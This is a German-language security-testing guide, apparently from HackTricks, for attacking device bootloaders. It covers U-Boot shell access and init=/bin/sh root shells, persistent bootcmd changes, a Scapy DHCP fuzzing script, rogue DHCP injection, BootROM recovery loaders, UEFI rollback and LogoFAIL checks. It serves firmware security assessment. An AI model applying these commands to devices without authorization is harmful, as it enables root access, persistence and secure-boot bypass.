# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Startkonfigurationen von Geräten zu ändern und Bootloader wie U-Boot und UEFI-basierte Loader zu testen. Konzentriere dich darauf, frühe Codeausführung zu erreichen, Signatur-/Rollback-Schutzmechanismen zu bewerten und Recovery- oder Network-Boot-Pfade auszunutzen.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot — schnelle Erfolge und Missbrauch der Environment

1. Auf die Interpreter-Shell zugreifen
- Während des Bootvorgangs eine bekannte Break-Taste drücken (oft irgendeine Taste, 0, Space oder eine boardspezifische "Magic"-Sequenz), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.

2. Boot-Zustand und Variablen prüfen
- Nützliche Befehle:
- `printenv` (Environment ausgeben)
- `bdinfo` (Board-Info, Speicheradressen)
- `help bootm; help booti; help bootz` (unterstützte Kernel-Boot-Methoden)
- `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Boot-Argumente ändern, um eine Root-Shell zu erhalten
- Hänge `init=/bin/sh` an, damit der Kernel statt des normalen init in eine Shell fällt:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot vom TFTP-Server
- Netzwerk konfigurieren und ein Kernel/FIT-Image aus dem LAN holen:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Änderungen persistent machen via Environment
- Wenn der Env-Speicher nicht schreibgeschützt ist, kannst du Kontrolle persistieren:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Abbrüche in die Shell ermöglichen.

6. Auf Debug-/unsichere Funktionen prüfen
- Achte auf: `bootdelay` > 0, deaktiviertes `autoboot`, uneingeschränktes `usb start; fatload usb 0:1 ...`, Fähigkeit zu `loady`/`loads` über Serial, `env import` von untrusted media und Kernel/Ramdisks, die ohne Signaturprüfung geladen werden.

7. U-Boot Image-/Verifikations-Tests
- Wenn die Plattform secure/verified boot mit FIT-Images behauptet, teste sowohl unsigned als auch manipulierte Images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder das alte Verhalten `verify=n` erlaubt oft das Booten beliebiger Payloads.

## Network-Boot-Angriffsfläche (DHCP/PXE) und bösartige Server

8. PXE/DHCP-Parameter-Fuzzing
- U-Boots legacy BOOTP/DHCP-Handling hatte Memory-Safety-Probleme. Zum Beispiel beschreibt CVE‑2024‑42040 eine Speicheroffenlegung via manipulierte DHCP-Antworten, die bytes aus dem U-Boot-Speicher über das Netzwerk leak können. Fahre die DHCP/PXE-Codepfade mit überlangen/Edge-Case-Werten hoch (Option 67 bootfile-name, Vendor-Options, file/servername-Felder) und beobachte Hänger/leak-Verhalten.
- Minimaler Scapy-Snippet, um Boot-Parameter während Netboot zu stressen:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Prüfe außerdem, ob PXE-Filename-Felder an Shell/Loader-Logik übergeben werden, ohne saniert zu werden, wenn sie an OS-seitige Provisioning-Skripte weitergereicht werden.

9. Testen auf Command-Injection via bösartigem DHCP-Server
- Richte einen bösartigen DHCP/PXE-Service ein und versuche, Zeichen in Datei- oder Optionsfelder zu injizieren, um spätere Stufen der Boot-Kette zu erreichen. Metasploit’s DHCP auxiliary, `dnsmasq` oder eigene Scapy-Skripte eignen sich gut. Isoliere zuerst das Lab-Netz.

## SoC-ROM-Recovery-Modi, die den normalen Boot überschreiben

Viele SoCs bieten einen BootROM-"loader"-Modus, der Code über USB/UART annimmt, selbst wenn Flash-Images ungültig sind. Wenn secure-boot-Fuses nicht gebrannt sind, kann dies sehr früh im Chain arbitrary code execution ermöglichen.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
- Beispiel: `imx-usb-loader u-boot.imx`, um ein benutzerdefiniertes U-Boot in RAM zu pushen und auszuführen.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, um einen Loader zu stage-en und ein benutzerdefiniertes U-Boot hochzuladen.

Bewerte, ob das Gerät secure-boot eFuses/OTP gebrannt hat. Falls nicht, umgehen BootROM-Download-Modi häufig jegliche höherstufige Verifikation (U-Boot, Kernel, rootfs), indem sie deinen First-Stage-Payload direkt aus SRAM/DRAM ausführen.

## UEFI/PC-Klassen Bootloader — schnelle Prüfungen

10. ESP-Manipulation und Rollback-Tests
- Mount die EFI System Partition (ESP) und prüfe Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, Vendor-Logo-Pfade.
- Versuche, mit gedowngradeten oder bekannten-vulnerablen signed Boot-Komponenten zu booten, falls Secure Boot-Revocations (`dbx`) nicht aktuell sind. Wenn die Plattform alte shims/bootmanagers noch vertraut, kannst du oft deinen eigenen Kernel oder `grub.cfg` von der ESP laden, um Persistenz zu erreichen.

11. Boot-Logo-Parsing-Fehler (LogoFAIL-Klasse)
- Mehrere OEM/IBV-Firmwares waren anfällig für Image-Parsing-Fehler in DXE, die Boot-Logos verarbeiten. Wenn ein Angreifer ein crafted Image auf der ESP unter einem vendor-spezifischen Pfad platzieren kann (z. B. `\EFI\<vendor>\logo\*.bmp`) und neu bootet, kann während des frühen Boots Codeausführung möglich sein, selbst wenn Secure Boot aktiviert ist. Teste, ob die Plattform user-supplied Logos akzeptiert und ob diese Pfade vom OS beschreibbar sind.

## Hardware-Vorsicht

Sei vorsichtig beim Umgang mit SPI-/NAND-Flash während des frühen Boots (z. B. Pins kurzschließen, um Reads zu umgehen) und konsultiere immer das Flash-Datasheet. Falsch getimte Shorts können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- Probiere `env export -t ${loadaddr}` und `env import -t ${loadaddr}`, um Environment-Blobs zwischen RAM und Storage zu verschieben; einige Plattformen erlauben das Importieren von env von entfernbarem Medium ohne Authentifizierung.
- Für Persistenz auf Linux-basierten Systemen, die via `extlinux.conf` booten, reicht es oft, die `APPEND`-Zeile auf der Boot-Partition zu ändern (um `init=/bin/sh` oder `rd.break` zu injizieren), wenn keine Signaturprüfungen erzwungen werden.
- Wenn Userland `fw_printenv/fw_setenv` anbietet, prüfe, ob `/etc/fw_env.config` mit dem echten Env-Speicher übereinstimmt. Fehlkonfigurierte Offsets erlauben das Lesen/Schreiben der falschen MTD-Region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
